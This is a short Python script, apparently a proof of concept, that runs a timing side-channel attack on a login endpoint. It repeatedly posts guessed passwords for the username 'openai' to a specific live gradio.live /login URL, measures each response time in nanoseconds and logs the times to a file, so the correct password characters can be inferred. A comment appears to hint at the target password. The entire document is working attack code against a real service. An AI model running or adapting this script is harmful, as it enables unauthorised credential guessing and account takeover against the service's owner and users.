import sys
import getopt
import time
import requests

import argparse

out_file = None

parser = argparse.ArgumentParser(prog='cve', description='What the program does', epilog='Text at the bottom of help')

parser.add_argument('-c', action='append')
parser.add_argument('-r')
parser.add_argument('output_file')
args = parser.parse_args()

characters = args.c
repeats = int(args.r, 10)

print(characters)

with open(args.output_file, "w+") as out_fd:
    out_fd.write("raw times\n")
    for i in range(repeats):
        print("pass {0}/{1} executed".format(i, repeats))
        for character in characters:
            print(character)
            data = {
                'username': 'openai',
                'password': 'i{0}AAAAAA'.format(character)#isCloseAi
            }

            time_start = time.monotonic_ns()
            try:
                r = requests.post("https://29f8a8329e423aad91.gradio.live/login", data)
            except:
                pass

            diff = time.monotonic_ns() - time_start

            out_fd.write("{0}\n".format(diff))
